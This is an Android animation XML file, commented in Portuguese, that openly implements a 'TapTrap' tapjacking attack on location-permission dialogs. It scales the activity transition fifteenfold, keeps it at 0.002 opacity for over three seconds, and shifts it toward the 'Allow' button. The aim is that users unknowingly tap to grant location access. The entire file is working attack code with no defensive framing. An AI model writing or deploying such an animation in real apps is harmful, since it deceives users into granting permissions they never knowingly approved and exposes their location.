<?xml version="1.0" encoding="utf-8"?>
<!-- Animação TapTrap específica para permissões de localização -->
<set xmlns:android="http://schemas.android.com/apk/res/android">
    <!-- Escalar para posição específica de diálogos de localização -->
    <scale
        android:fromXScale="15"
        android:toXScale="15" 
        android:fromYScale="15"
        android:toYScale="15"
        android:pivotX="60%"
        android:pivotY="45%"
        android:repeatCount="1"
        android:duration="3200" />
    <!-- Transparência quase total -->
    <alpha
        android:fromAlpha="0.002"
        android:toAlpha="0.002"
        android:repeatCount="1"
        android:duration="3200" />
    <!-- Deslocamento para área do botão Allow -->
    <translate
        android:fromXDelta="10%"
        android:toXDelta="15%"
        android:fromYDelta="5%"
        android:toYDelta="10%"
        android:duration="3200" />
</set>